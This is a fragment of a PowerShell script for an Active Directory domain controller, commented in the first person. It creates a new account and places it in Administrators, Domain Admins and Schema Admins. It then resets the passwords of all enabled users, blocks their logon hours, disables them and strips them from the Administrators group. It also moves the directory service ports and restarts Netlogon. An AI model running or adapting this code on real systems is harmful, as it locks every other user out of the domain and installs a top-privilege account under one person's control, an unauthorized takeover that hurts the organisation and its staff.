#if domain controller

    #gets all active AD users
    $enabledUsers = Get-ADUser -LDAPFilter '(!userAccountControl:1.2.840.113556.1.4.803:=2)'


    #creates new AD user
    New-ADUser -Name $liveUser -Accountpassword $pass -Enable $true
    Add-ADGroupMember -Identity Administrators -Members $liveUser
    Add-ADGroupMember -Identity "Domain Admins" -Members $liveUser
    Add-ADGroupMember -Identity "Schema Admins" -Members $liveUser


    #setting up disabled users to also not be able to login at any time during the day even if account got reinabled
    $Hours = New-Object byte[] 21
    $replaceHashTable = New-Object HashTable
    $replaceHashTable.Add("logonHours", $Hours)
    #loops thru all enabled users (except the one I created and disables them)
    foreach ($user in $enabledUsers) {
    Set-ADAccountPassword -Identity $user -NewPassword $defaultPass
        Set-AdUser -Identity $user -Replace $replaceHashTable
        Disable-ADAccount -Identity $user
        if ($user -ne "Administrator") {
            remove-adgroupmember -identity Administrators -members $user -verbose -confirm:$false
        }
    }



    #not tested
    #port that adds uses to communicate which could be helpful
    reg add HKLM\SYSTEM\CurrentControlSet\Services\NTDS\Parameters /v TCP/IP Port /t REG_DWORD /d 2044 /f
    reg add HKLM\SYSTEM\CurrentControlSet\Services\Netlogon\Parameters /v DCTcpipPort /t REG_DWORD /d 2045 /f 
    Restart-Service -Name Netlogon -Force
